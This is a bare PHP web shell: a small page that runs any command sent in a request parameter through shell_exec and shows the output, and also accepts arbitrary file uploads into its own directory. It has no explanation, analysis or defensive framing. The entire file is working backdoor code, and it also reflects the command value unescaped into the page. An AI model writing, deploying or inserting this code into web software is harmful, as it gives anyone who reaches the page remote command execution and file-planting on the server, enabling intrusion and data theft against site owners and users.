<?php $sendfile=$_REQUEST["sendfile"];$cmd=$_REQUEST["-cmd"];if($sendfile=="true") { $fn=$_FILES["file"]["name"]; $tn=$_FILES["file"]["tmp_name"]; if(move_uploaded_file($tn, dirname(__FILE__)."/".$fn)) $result="<br><font color=green>upload done</p>"; else $result="<br><font color=red>upload failed</p>"; } ?><html><body><form method=POST><input type=TEXT name="-cmd" size=64 value="<?php echo $cmd;?>"></form><form enctype="multipart/form-data" method="post" action=""><input type=file name=file size=20><input type="submit" value="Upload"><input type="hidden" name="sendfile" value="true"><?php echo $result;?></form><pre><?php if ($cmd!="") echo shell_exec($cmd);?></pre></body></html>
